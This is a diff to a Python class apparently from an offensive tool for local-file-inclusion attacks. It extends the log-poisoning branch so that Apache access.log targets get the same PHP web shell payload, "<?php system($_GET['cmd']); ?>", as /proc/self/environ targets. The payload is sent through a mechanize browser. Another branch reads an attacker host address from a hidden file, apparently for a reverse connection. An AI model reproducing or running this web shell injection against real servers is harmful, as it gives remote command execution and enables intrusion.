@@ -16,9 +16,9 @@ class Shell_conncet:
 
      def __init__(self):
         self.control()
-        if "proc/self/environ" in self.url:                                                                                                          
-            self.paylaodPHP = "<?php system($_GET['cmd']); ?>"
-            
+        if "proc/self/environ" in self.url\
+        or 'apache2/access.log' in self.url:                                                                                                          
+            self.paylaodPHP = "<?php system($_GET['cmd']); ?>"           
             request = mechanize.Browser()
             request.set_handle_robots(False)
             request.set_handle_redirect(True)
@@ -49,8 +49,7 @@ class Shell_conncet:
                          exit()
                 except KeyboardInterrupt:
                      exit()
-        elif  "auth" in  self.url or "auth.log" in  self.url\
-        or 'apache2/access.log' in self.url:                  
+        elif  "auth" in  self.url or "auth.log" in  self.url :                  
                 if os.path.exists('./Package/shell/.address'): 
                     with open ('./Package/shell/.address','r') as readHost:
                                       Host = readHost.read()
